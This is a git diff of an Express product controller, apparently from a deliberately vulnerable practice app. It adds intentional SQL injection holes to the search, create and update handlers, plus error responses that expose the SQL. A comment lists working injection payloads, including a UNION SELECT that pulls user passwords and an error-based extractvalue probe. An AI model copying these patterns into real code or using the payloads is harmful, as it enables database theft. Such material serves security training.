@@ -81,8 +81,17 @@ export const searchProducts = async (req, res, next) => {
         );
 
         // ⚠️ VULNERABLE: SQL Injection en búsqueda
-        // Ejemplo de exploit: /api/productos/search/chair' OR '1'='1
-        const query = `SELECT * FROM products WHERE name LIKE '%${term}%' OR description LIKE '%${term}%'`;
+        // Esta construcción es MÁS VULNERABLE para permitir múltiples tipos de ataques:
+        //
+        // Payloads que funcionan:
+        // 1. Bypass simple: ' OR '1'='1
+        // 2. Comentarios: ' OR 1=1 --
+        // 3. Union-based: ' UNION SELECT id,username,email,password,role,1,1,NOW(),NOW(),0 FROM users --
+        // 4. Boolean-based: ' OR (SELECT COUNT(*) FROM users WHERE role='admin')>0 --
+        // 5. Error-based: ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))) --
+        const query = `SELECT * FROM products WHERE nombre LIKE '%${term}%'`;
+
+        console.log(`🔍 Executing search query: ${query}`);
 
         const products = await executeRawQuery(query);
 
@@ -99,7 +108,14 @@ export const searchProducts = async (req, res, next) => {
             `❌ Error searching products with term "${req.params.term}":`,
             error.message
         );
-        next(error);
+
+        // ⚠️ VULNERABLE: Expone detalles del error SQL
+        res.status(500).json({
+            error: "Search failed",
+            message: error.message,
+            sql: error.sql, // Expone la query que falló
+            searchTerm: req.params.term,
+        });
     }
 };
 
@@ -109,12 +125,13 @@ export const searchProducts = async (req, res, next) => {
 // =====================================================
 export const createProduct = async (req, res, next) => {
     try {
-        const { name, description, price, stock, image_url } = req.body;
+        const { nombre, descripcion, precio, stock, categoria, imagenUrl } =
+            req.body;
 
-        console.log(`📦 POST /api/productos - Creating new product: ${name}`);
+        console.log(`📦 POST /api/productos - Creating new product: ${nombre}`);
 
         // Validación básica
-        if (!name || !price) {
+        if (!nombre || !precio) {
             return res.status(400).json({
                 error: "Validation error",
                 message: "Name and price are required",
@@ -123,10 +140,10 @@ export const createProduct = async (req, res, next) => {
 
         // ⚠️ VULNERABLE: SQL Injection en INSERT
         const query = `
-            INSERT INTO products (name, description, price, stock, image_url) 
-            VALUES ('${name}', '${description || ""}', ${price}, ${
+            INSERT INTO products (nombre, descripcion, precio, stock, categoria, imagenUrl) 
+            VALUES ('${nombre}', '${descripcion || ""}', ${precio}, ${
             stock || 0
-        }, '${image_url || ""}')
+        }, '${categoria || ""}', '${imagenUrl || ""}')
         `;
 
         const result = await executeRawQuery(query);
@@ -139,11 +156,12 @@ export const createProduct = async (req, res, next) => {
             productId: result.insertId,
             product: {
                 id: result.insertId,
-                name,
-                description,
-                price,
+                nombre,
+                descripcion,
+                precio,
                 stock,
-                image_url,
+                categoria,
+                imagenUrl,
             },
         });
     } catch (error) {
@@ -159,18 +177,20 @@ export const createProduct = async (req, res, next) => {
 export const updateProduct = async (req, res, next) => {
     try {
         const { id } = req.params;
-        const { name, description, price, stock, image_url } = req.body;
+        const { nombre, descripcion, precio, stock, categoria, imagenUrl } =
+            req.body;
 
         console.log(`📦 PUT /api/productos/${id} - Updating product`);
 
         // ⚠️ VULNERABLE: SQL Injection en UPDATE
         const updates = [];
-        if (name) updates.push(`name = '${name}'`);
-        if (description !== undefined)
-            updates.push(`description = '${description}'`);
-        if (price !== undefined) updates.push(`price = ${price}`);
+        if (nombre) updates.push(`nombre = '${nombre}'`);
+        if (descripcion !== undefined)
+            updates.push(`descripcion = '${descripcion}'`);
+        if (precio !== undefined) updates.push(`precio = ${precio}`);
         if (stock !== undefined) updates.push(`stock = ${stock}`);
-        if (image_url !== undefined) updates.push(`image_url = '${image_url}'`);
+        if (categoria !== undefined) updates.push(`categoria = '${categoria}'`);
+        if (imagenUrl !== undefined) updates.push(`imagenUrl = '${imagenUrl}'`);
 
         if (updates.length === 0) {
             return res.status(400).json({
